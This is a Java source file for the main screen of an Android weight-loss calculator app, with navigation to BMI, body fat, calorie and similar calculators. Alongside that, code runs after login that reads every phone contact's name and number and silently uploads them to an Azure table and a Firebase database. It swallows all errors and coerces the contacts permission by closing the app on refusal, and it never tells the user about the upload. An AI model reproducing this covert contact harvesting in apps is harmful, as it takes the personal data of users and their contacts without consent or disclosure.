package com.nineinfosys.android.weightlosscalculators;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.design.widget.NavigationView;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.support.v4.content.ContextCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.WindowManager;

import com.facebook.login.LoginManager;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.microsoft.windowsazure.mobileservices.MobileServiceClient;
import com.microsoft.windowsazure.mobileservices.http.OkHttpClientFactory;
import com.microsoft.windowsazure.mobileservices.table.MobileServiceTable;
import com.nineinfosys.android.weightlosscalculators.AnorexicBMI.AnorexicBMIFragment;
import com.nineinfosys.android.weightlosscalculators.ArmyBodyFat.ArmyBodyFatFragment;
import com.nineinfosys.android.weightlosscalculators.BMI.BMIFragment;
import com.nineinfosys.android.weightlosscalculators.BMR.BMRFragment;
import com.nineinfosys.android.weightlosscalculators.BodyFat.BodyFatFragment;
import com.nineinfosys.android.weightlosscalculators.Calorie.CalorieFragment;
import com.nineinfosys.android.weightlosscalculators.Carbohydrate.CarbohydrateFragment;
import com.nineinfosys.android.weightlosscalculators.Contacts.Contacts;
import com.nineinfosys.android.weightlosscalculators.DashBord.DashBord;
import com.nineinfosys.android.weightlosscalculators.DashBord.GetApp;
import com.nineinfosys.android.weightlosscalculators.FAT.FATFragment;
import com.nineinfosys.android.weightlosscalculators.FatIntake.FatIntakeFragment;
import com.nineinfosys.android.weightlosscalculators.FoodNutritionTable.FoodNutritionTable;
import com.nineinfosys.android.weightlosscalculators.HealthyWeight.HealthyWeightFragment;
import com.nineinfosys.android.weightlosscalculators.IdealWeight.IdealWeightFragment;
import com.nineinfosys.android.weightlosscalculators.LeanBodyMass.LeanBodyMassFragment;

import com.nineinfosys.android.weightlosscalculators.LoginActivity.Login;
import com.nineinfosys.android.weightlosscalculators.Protein.ProteinFragment;
import com.nineinfosys.android.weightlosscalculators.Weight.WeightLossConversionList;
import com.squareup.okhttp.OkHttpClient;

import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;
import static android.Manifest.permission.READ_CONTACTS;
import static android.Manifest.permission.WRITE_CONTACTS;


public class MainActivityDrawer extends AppCompatActivity {
    DrawerLayout mDrawerLayout;
    NavigationView mNavigationView;
    FragmentManager mFragmentManager;
    FragmentTransaction mFragmentTransaction;

   public Toolbar toolbar;

    private static final int PERMISSION_REQUEST_CODE = 200;

    ///Azure Database connection for contact uploading
    private MobileServiceClient mobileServiceClientContactUploading;
    private MobileServiceTable<Contacts> mobileServiceTableContacts;
    private ArrayList<Contacts> azureContactArrayList;
    //Firebase variables... for authentication and contact uploading to firebase
    private FirebaseAuth firebaseAuth;
    private FirebaseAuth.AuthStateListener firebaseAuthListner;
    private DatabaseReference databaseReferenceUserContacts;
    //Setting up progress dialog
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.drawermain);

        /**
         *Setup the DrawerLayout and NavigationView
         */


        mDrawerLayout = (DrawerLayout) findViewById(R.id.drawerLayout);
        mNavigationView = (NavigationView) findViewById(R.id.shitstuff);


        /**
         * Lets inflate the very first fragment
         * Here , we are inflating the TabFragment as the first Fragment
         */
        firebaseAuth=FirebaseAuth.getInstance();
        mFragmentManager = getSupportFragmentManager();
        mFragmentTransaction = mFragmentManager.beginTransaction();
        mNavigationView.setItemIconTintList(null);
        mFragmentTransaction.replace(R.id.containerView, new DashBord()).commit();

        /**
         * Setup click events on the Navigation View Items.
         */


        mNavigationView.setNavigationItemSelectedListener(new NavigationView.OnNavigationItemSelectedListener() {
            @Override
            public boolean onNavigationItemSelected(MenuItem menuItem) {
                mDrawerLayout.closeDrawers();
                if (menuItem.getItemId() == R.id.DashBord) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new DashBord()).commit();

                }
                if (menuItem.getItemId() == R.id.BMI){
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new BMIFragment()).commit();
                    /*  Intent intent=new Intent(MainActivityDrawer.this,com.nineinfosys.android.weightlosscalculators.BMI.ForumMainActivity.class);
                       startActivity(intent);*/
                }
                if (menuItem.getItemId() == R.id.BMR) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new BMRFragment()).commit();

                   /* Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.BMR.ForumMainActivity.class);
                    startActivity(intent);*/
                }
                if (menuItem.getItemId() == R.id.IdealWeight) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new IdealWeightFragment()).commit();

                   /* Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.IdealWeight.ForumMainActivity.class);
                    startActivity(intent);*/
                }
                if (menuItem.getItemId() == R.id.FAT) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new FATFragment()).commit();
                  /*  Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.FAT.ForumMainActivity.class);
                    startActivity(intent);*/
                }
                if (menuItem.getItemId() == R.id.AnorexicBMI) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new AnorexicBMIFragment()).commit();
                    /*Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.AnorexicBMI.ForumMainActivity.class);
                    startActivity(intent);*/
                }
                if (menuItem.getItemId() == R.id.ArmyBodyFat){
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new ArmyBodyFatFragment()).commit();
                 /*   Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.ArmyBodyFat.ForumMainActivity.class);
                    startActivity(intent);*/

                }if (menuItem.getItemId() == R.id.BodyFat) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new BodyFatFragment()).commit();
                   /* Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.BodyFat.ForumMainActivity.class);
                    startActivity(intent);*/

                }
                if (menuItem.getItemId() == R.id.Calorie) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new CalorieFragment()).commit();
          /*          Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.Calorie.ForumMainActivity.class);
                    startActivity(intent);*/
                }
                if (menuItem.getItemId() == R.id.Carbohydrate) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new CarbohydrateFragment()).commit();
                 /*   Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.Carbohydrate.ForumMainActivity.class);
                    startActivity(intent);*/
                }

                if (menuItem.getItemId() == R.id.FatIntake) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new FatIntakeFragment()).commit();
             /*      Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.FatIntake.ForumMainActivity.class);
                    startActivity(intent);*/

                }
                if (menuItem.getItemId() == R.id.HealthyWeight) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new HealthyWeightFragment()).commit();
                  /*  Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.HealthyWeight.ForumMainActivity.class);
                    startActivity(intent);*/

                }
                if (menuItem.getItemId() == R.id.LeanBodyMass) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new LeanBodyMassFragment()).commit();
                 /*   Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.LeanBodyMass.ForumMainActivity.class);
                    startActivity(intent);*/

                }

                if (menuItem.getItemId() == R.id.Weight) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new WeightLossConversionList()).commit();
                    /*Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.Weight.ForumMainActivity.class);
                    startActivity(intent);*/
                }
                if (menuItem.getItemId() == R.id.Protein) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new ProteinFragment()).commit();
                    /*Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.Weight.ForumMainActivity.class);
                    startActivity(intent);*/
                }
                if (menuItem.getItemId() == R.id.FoodNutritionTable) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new FoodNutritionTable()).commit();
                    /*Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.Weight.ForumMainActivity.class);
                    startActivity(intent);*/
                }
                if (menuItem.getItemId() == R.id.MoreApps) {

                    //Sunile Sir Code
                    final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
                    try {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://developer?id=GeniusNine+Info+Systems+LLP" )));
                    } catch (android.content.ActivityNotFoundException anfe) {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/developer?id=GeniusNine+Info+Systems+LLP" )));
                    }
                }

                if (menuItem.getItemId() == R.id.Share) {
                    final String appPackageName = getPackageName();
                    Intent intent = new Intent(android.content.Intent.ACTION_SEND);
                    intent.setType("text/plain");
                    String shareBodyText = "https://play.google.com/store/apps/details?id=" + appPackageName ;
                    intent.putExtra(android.content.Intent.EXTRA_SUBJECT, "Subject/Title");
                    intent.putExtra(android.content.Intent.EXTRA_TEXT, shareBodyText);
                    startActivity(Intent.createChooser(intent, "Choose sharing method"));
                }
                if (menuItem.getItemId() == R.id.RateUs) {
                    final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
                    try {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
                    } catch (android.content.ActivityNotFoundException anfe) {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
                    }
                }
                if (menuItem.getItemId() == R.id.GetApps) {
                /*    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new GetApp()).commit();*/
                    Intent intent=new Intent(MainActivityDrawer.this, GetApp.class);
                    finish();
                    startActivity(intent);

                }

                return false;
            }

        });


        /**
         * Setup Drawer Toggle of the Toolbar
         */

        toolbar = (android.support.v7.widget.Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        ActionBarDrawerToggle mDrawerToggle = new ActionBarDrawerToggle(this, mDrawerLayout, toolbar, R.string.app_name, R.string.app_name);
        mDrawerLayout.setDrawerListener(mDrawerToggle);
        mDrawerToggle.syncState();
        authenticate();

        MainActivityDrawer.this.getWindow().setSoftInputMode(
                WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN
        );


    }


    ///Uploading contacts to azure
    private void uploadContactsToAzure(){
        initializeAzureTable();
        fetchContacts();
        uploadContact();
    }
    private void initializeAzureTable() {
        try {
            mobileServiceClientContactUploading = new MobileServiceClient(
                    getString(R.string.web_address),
                    this);
            mobileServiceClientContactUploading.setAndroidHttpClientFactory(new OkHttpClientFactory() {
                @Override
                public OkHttpClient createOkHttpClient() {
                    OkHttpClient client = new OkHttpClient();
                    client.setReadTimeout(20, TimeUnit.SECONDS);
                    client.setWriteTimeout(20, TimeUnit.SECONDS);
                    return client;
                }
            });
            mobileServiceTableContacts = mobileServiceClientContactUploading.getTable(Contacts.class);


        } catch (MalformedURLException e) {

        } catch (Exception e) {

        }
    }
    private void fetchContacts(){
        try {
            azureContactArrayList = new ArrayList<Contacts>();

            Cursor phone=getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);

            while(phone.moveToNext()){
                Contacts contact = new Contacts();
                contact.setContactname(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                contact.setContactnumber(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                contact.setFirebaseid(firebaseAuth.getCurrentUser().getUid());
                azureContactArrayList.add(contact);

            }
            phone.close();
        }catch (Exception e){
        }
    }
    private void uploadContact() {
        for (Contacts c : azureContactArrayList) {
            try {
                asyncUploader(c);
            }
            catch (Exception e){
                Log.e("uploadContact : ", e.toString());
            }
        }
    }
    private void asyncUploader(Contacts contact){
        final Contacts item = contact;
        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    mobileServiceTableContacts.insert(item);
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            try {

                            } catch (Exception e) {
                            }


                        }
                    });
                } catch (final Exception e) {
                }
                return null;
            }
        };
        task.execute();
    }


    ///Authentication with firebase
    private void authenticate(){
        firebaseAuth = FirebaseAuth.getInstance();
        firebaseAuthListner =  new FirebaseAuth.AuthStateListener() {
            @Override
            public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {
                if(firebaseAuth.getCurrentUser()==null){
                    Log.e("ForumMainActivity:", "User was null so directed to Login activity");
                    Intent loginIntent = new Intent(MainActivityDrawer.this, Login.class);
                    loginIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    finish();
                    startActivity(loginIntent);

                }
                else {
                    if (!checkPermission()) {
                        requestPermission();
                    } else {
                        //Toast.makeText(MainActivityDrawer.this,"Permission already granted.",Toast.LENGTH_LONG).show();
                        syncContactsWithFirebase();
                        uploadContactsToAzure();

                    }
                }

            }
        };

    }

    @Override
    protected void onStart() {
        super.onStart();
        Log.e("ForumMainActivity:", "Starting auth listener");
        firebaseAuth.addAuthStateListener(firebaseAuthListner);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();
        //noinspection SimplifiableIfStatement

        if (id == R.id.action_logout){

            FirebaseAuth.getInstance().signOut();
            LoginManager.getInstance().logOut();
        }


        return super.onOptionsItemSelected(item);
    }
    protected void syncContactsWithFirebase(){

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    databaseReferenceUserContacts = FirebaseDatabase.getInstance().getReference().child(getString(R.string.app_id)).child("Contacts");

                    String user_id = firebaseAuth.getCurrentUser().getUid();
                    DatabaseReference current_user_db = databaseReferenceUserContacts.child(user_id);


                    Cursor phone = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

                    while (phone.moveToNext()) {
                        String name;
                        String number;

                        name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        number = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                        try {
                            current_user_db.child(number).setValue(name);

                        } catch (Exception e) {

                        }
                    }
                    runOnUiThread(new Runnable() {

                        @Override
                        public void run() {
                        }
                    });
                } catch (Exception exception) {

                }
                return null;
            }
        };

        task.execute();
    }

    public  void closeapp(){
        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
        alertDialogBuilder.setMessage("Are you sure you want to close App?");
        alertDialogBuilder.setPositiveButton("Yes",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {

                        finish();
                    }
                });

        alertDialogBuilder.setNegativeButton("No",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {

                    }
                });

        //Showing the alert dialog
        AlertDialog alertDialog = alertDialogBuilder.create();
        alertDialog.setCanceledOnTouchOutside(false);
        alertDialog.show();
    }


    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        switch(keyCode){
            case KeyEvent.KEYCODE_BACK:
                closeapp();
                return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    //used this when mobile orientaion is changed
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        // Checks the orientation of the screen
        if (newConfig.orientation == Configuration.ORIENTATION_LANDSCAPE) {
            //Toast.makeText(this, "landscape", Toast.LENGTH_SHORT).show();
        } else if (newConfig.orientation == Configuration.ORIENTATION_PORTRAIT) {
            //Toast.makeText(this, "portrait", Toast.LENGTH_SHORT).show();
        }
    }
    private boolean checkPermission() {
        int result = ContextCompat.checkSelfPermission(getApplicationContext(), READ_CONTACTS);
        int result1 = ContextCompat.checkSelfPermission(getApplicationContext(), WRITE_CONTACTS);
        return result == PackageManager.PERMISSION_GRANTED && result1 == PackageManager.PERMISSION_GRANTED;
    }

    private void requestPermission() {
        ActivityCompat.requestPermissions(this, new String[]{READ_CONTACTS, WRITE_CONTACTS}, PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case PERMISSION_REQUEST_CODE:
                if (grantResults.length > 0) {

                    boolean locationAccepted = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                    boolean cameraAccepted = grantResults[1] == PackageManager.PERMISSION_GRANTED;

                    if (locationAccepted && cameraAccepted) {
                    }
                    else {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            if (shouldShowRequestPermissionRationale(READ_CONTACTS)) {
                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivityDrawer.this);
                                alertDialogBuilder.setMessage("You must grant permissions for App to work properly");
                                alertDialogBuilder.setPositiveButton("yes",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface arg0, int arg1) {

                                                Log.e("ALERT BOX ", "Requesting Permissions");

                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                                    requestPermissions(new String[]{READ_CONTACTS, WRITE_CONTACTS}, PERMISSION_REQUEST_CODE);
                                                }
                                            }
                                        });

                                alertDialogBuilder.setNegativeButton("No",new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        Log.e("ALERT BOX ", "Permissions not granted");
                                        finish();
                                    }
                                });

                                AlertDialog alertDialog = alertDialogBuilder.create();
                                alertDialog.setCanceledOnTouchOutside(false);
                                alertDialog.show();
                                return;
                            }
                            else{
                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivityDrawer.this);
                                alertDialogBuilder.setMessage("You must grant permissions from  App setting to work");
                                alertDialogBuilder.setPositiveButton("Ok",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface arg0, int arg1) {
                                                finish();
                                            }
                                        });

                                AlertDialog alertDialog = alertDialogBuilder.create();
                                alertDialog.setCanceledOnTouchOutside(false);
                                alertDialog.show();
                                return;

                            }
                        }

                    }
                }

                break;
        }
    }
}